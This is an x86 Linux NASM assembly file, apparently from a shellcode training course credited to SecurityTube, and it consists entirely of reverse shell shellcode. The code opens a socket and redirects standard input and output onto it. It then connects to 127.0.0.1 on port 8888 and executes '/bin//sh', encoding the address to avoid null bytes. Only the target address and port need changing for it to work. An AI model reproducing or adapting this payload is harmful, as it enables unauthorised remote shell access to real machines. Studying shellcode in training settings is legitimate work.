; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:
	; Socket - 359
	; int socket (
    ;  int domain = 2;
    ;  int type = 1;
    ;  int protocol = 0;
	; ) =  14;
	xor eax, eax
	mov ax, 0x167
	xor ebx, ebx
	mov bl, 2
	xor ecx, ecx
	mov cl, 1
	xor edx, edx
	int 0x80
	mov dword esi, eax


dup2:
	;fd 0
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	int 0x80
	;fd 1
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	mov cl, 1
	int 0x80
	;fd 2
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	mov cl, 2
	int 0x80


connect:
	;Connect - 362
	xor eax, eax
	mov ax, 0x16a
	mov ebx, esi	
	xor edi, edi
	mov edi, 0x12111190 ; We want 0x100007F, but we need to avoid nops
	sub edi, 0x11111111
	push edi  			;push 16777343		; ip 127.0.0.1, big endian
    push word 0xb822 	; port 8888, big endian
    push word 2 
	mov ecx, esp
	xor edx, edx
	mov dl, 0x66 		; 102
	int 0x80


execve:
	; Execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80